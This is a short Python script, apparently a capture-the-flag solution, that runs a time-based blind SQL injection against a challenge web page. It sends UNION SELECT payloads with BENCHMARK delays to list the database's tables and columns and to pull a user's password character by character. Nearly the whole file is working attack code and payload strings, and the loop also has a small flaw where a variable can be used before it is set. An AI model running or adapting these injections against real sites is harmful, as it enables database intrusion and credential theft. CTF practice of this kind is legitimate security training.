import requests
import time

init_char = 32
final_char = 125
# useful_chars = [[32,44],list(range(48,58)), list(range(97,126))]
useful_chars = [list(range(32,126))]
useful_chars = [item for sublist in useful_chars for item in sublist]

def find_rows(format_string, char_range):
    row = ""
    for pos in range(1,100):
        for char in char_range:
            print("pos:{}, char:{}".format(pos, char))
            start = time.time()
            r = requests.post("https://web6.chall.necst.it/deckofsillythings.php", data = {"imgnumber": format_string.format(pos, char)})
            end = time.time()
            elapsed = end - start

            if elapsed > 3:
                print(elapsed)
                found_char = chr(char)
                row += found_char
                print(row)
                break
        if found_char == " ":
            break

find_tables_string = "1' UNION SELECT IF(SUBSTRING(group_concat(table_name),{},1) = CHAR({}), BENCHMARK(10000000,AES_ENCRYPT('hello','goodbye')), NULL), NULL from information_schema.tables where table_schema=database(); -- -"
#find_rows(find_tables_string, useful_chars)
# --- found tables [images, users]

find_columns_string = "1' UNION SELECT IF(SUBSTRING(group_concat(column_name),{},1) = CHAR({}), BENCHMARK(10000000,AES_ENCRYPT('hello','goodbye')), NULL), NULL from information_schema.columns where table_schema=database(); -- -"
#find_rows(find_columns_string, useful_chars)
# --- found columns [id, names | id, username, password]

find_user_string = "1' UNION SELECT IF(SUBSTRING(BINARY password,{},1) = CHAR({}), BENCHMARK(10000000,AES_ENCRYPT('hello','goodbye')), NULL), NULL from users where username='German'; -- -"
find_rows(find_user_string, useful_chars)